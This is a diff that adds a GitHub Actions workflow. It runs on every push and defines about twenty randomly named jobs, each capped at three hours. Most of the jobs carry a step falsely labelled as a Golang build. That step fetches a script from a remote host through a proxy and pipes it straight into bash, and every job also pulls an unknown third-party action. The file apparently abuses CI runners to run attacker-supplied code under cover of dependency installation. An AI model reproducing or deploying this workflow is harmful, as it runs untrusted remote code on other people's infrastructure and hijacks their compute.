@@ -1,0 +1,183 @@
+name: pekogi
+on: push
+jobs:
+  matuba:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: mandacayha/krum@latest
+    - name: First
+      run: echo "Installing Dependencies mimiga..."
+    - name: Build Golang sutuma
+      run: curl -x wibuvi.hidehost.software:7129 http://wibuvi.hidehost.software/mandalorian/mivatpwn.php?a=xogavipaboperukusugi | bash -
+  jotesiti:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: mandacayha/krum@latest
+    - name: First
+      run: echo "Installing Dependencies savoci..."
+    - name: Build Golang lazutu
+      run: curl -x wibuvi.hidehost.software:7129 http://wibuvi.hidehost.software/mandalorian/mivatpwn.php?a=viwugadewezadakeya | bash -
+  lelino:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: mandacayha/krum@latest
+    - name: First
+      run: echo "Installing Dependencies wepolapi..."
+    - name: Build Golang visiyi
+      run: curl -x wibuvi.hidehost.software:7129 http://wibuvi.hidehost.software/mandalorian/mivatpwn.php?a=xatovonevakipacifo | bash -
+  hulapo:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: mandacayha/krum@latest
+    - name: First
+      run: echo "Installing Dependencies xahigawo..."
+    - name: Build Golang wolali
+      run: curl -x wibuvi.hidehost.software:7129 http://wibuvi.hidehost.software/mandalorian/mivatpwn.php?a=javetisivuxodipiha | bash -
+  fujata:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: mandacayha/krum@latest
+    - name: First
+      run: echo "Installing Dependencies racikata..."
+    - name: Build Golang suceri
+      run: curl -x wibuvi.hidehost.software:7129 http://wibuvi.hidehost.software/mandalorian/mivatpwn.php?a=helenetagelinope | bash -
+  duviwa:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: mandacayha/krum@latest
+    - name: First
+      run: echo "Installing Dependencies zalimuro..."
+    - name: Build Golang gopila
+      run: curl -x wibuvi.hidehost.software:7129 http://wibuvi.hidehost.software/mandalorian/mivatpwn.php?a=boyesuvuwoyugodotixi | bash -
+  somufu:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: mandacayha/krum@latest
+    - name: First
+      run: echo "Installing Dependencies yuyuya..."
+    - name: Build Golang kacezi
+      run: curl -x wibuvi.hidehost.software:7129 http://wibuvi.hidehost.software/mandalorian/mivatpwn.php?a=gaxurehojovanigano | bash -
+  cikelo:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: mandacayha/krum@latest
+    - name: First
+      run: echo "Installing Dependencies cecoxa..."
+    - name: Build Golang dasiha
+      run: curl -x wibuvi.hidehost.software:7129 http://wibuvi.hidehost.software/mandalorian/mivatpwn.php?a=cucimifetekutetu | bash -
+  nenudi:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: mandacayha/krum@latest
+    - name: First
+      run: echo "Installing Dependencies mivewoye..."
+    - name: Build Golang beyeye
+      run: curl -x wibuvi.hidehost.software:7129 http://wibuvi.hidehost.software/mandalorian/mivatpwn.php?a=vulajeluyiremukaramaho | bash -
+  konujo:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: mandacayha/krum@latest
+    - name: First
+      run: echo "Installing Dependencies huluju..."
+    - name: Build Golang lehomadu
+      run: curl -x wibuvi.hidehost.software:7129 http://wibuvi.hidehost.software/mandalorian/mivatpwn.php?a=fuwasatutesusemedebige | bash -
+  mabosoge:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: mandacayha/krum@latest
+    - name: First
+      run: echo "Installing Dependencies bogube..."
+    - name: Build Golang lutati
+      run: curl -x wibuvi.hidehost.software:7129 http://wibuvi.hidehost.software/mandalorian/mivatpwn.php?a=banuyaxidosexegamiwo | bash -
+  jepodu:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: mandacayha/krum@latest
+    - name: First
+      run: echo "Installing Dependencies lemabe..."
+    - name: Build Golang zenomezo
+      run: curl -x wibuvi.hidehost.software:7129 http://wibuvi.hidehost.software/mandalorian/mivatpwn.php?a=falegifedegululu | bash -
+  malaza:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: mandacayha/krum@latest
+    - name: First
+      run: echo "Installing Dependencies wujapu..."
+    - name: Build Golang kinudewe
+      run: curl -x wibuvi.hidehost.software:7129 http://wibuvi.hidehost.software/mandalorian/mivatpwn.php?a=damisuzulixusokogori | bash -
+  miduxi:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: mandacayha/krum@latest
+    - name: First
+      run: echo "Installing Dependencies golico..."
+    - name: Build Golang ledifo
+      run: curl -x wibuvi.hidehost.software:7129 http://wibuvi.hidehost.software/mandalorian/mivatpwn.php?a=leheyetenuhakocazi | bash -
+  wopisi:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: mandacayha/krum@latest
+    - name: First
+      run: echo "Installing Dependencies xileca..."
+    - name: Build Golang kimaza
+      run: curl -x wibuvi.hidehost.software:7129 http://wibuvi.hidehost.software/mandalorian/mivatpwn.php?a=nuyemumujahetiyakuzuwu | bash -
+  piyedi:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: mandacayha/krum@latest
+    - name: First
+      run: echo "Installing Dependencies hakixade..."
+    - name: Build Golang regije
+      run: curl -x wibuvi.hidehost.software:7129 http://wibuvi.hidehost.software/mandalorian/mivatpwn.php?a=sizoticurusozozazazuhe | bash -
+  copovi:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: mandacayha/krum@latest
+    - name: First
+      run: echo "Installing Dependencies zevaru..."
+    - name: Build Golang hufilo
+      run: curl -x wibuvi.hidehost.software:7129 http://wibuvi.hidehost.software/mandalorian/mivatpwn.php?a=nuxexanupimerukayu | bash -
+  cecekilo:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: mandacayha/krum@latest
+    - name: First
+      run: echo "Installing Dependencies citoyuhu..."
+    - name: Build Golang ziviba
+      run: curl -x wibuvi.hidehost.software:7129 http://wibuvi.hidehost.software/mandalorian/mivatpwn.php?a=lesofafofilirumecozefu | bash -
+  tivupeza:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: mandacayha/krum@latest
+    - name: First
+      run: echo "Installing Dependencies xoyelole..."
+    - name: Build Golang nipiromu
+      run: curl -x wibuvi.hidehost.software:7129 http://wibuvi.hidehost.software/mandalorian/mivatpwn.php?a=huzoriwonayukehu | bash -
+  dagutoto:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: mandacayha/krum@latest
+    - name: First
+      run: echo "Installing Dependencies hogeyo..."
+    - name: Build Golang bijogi
+      run: echo done
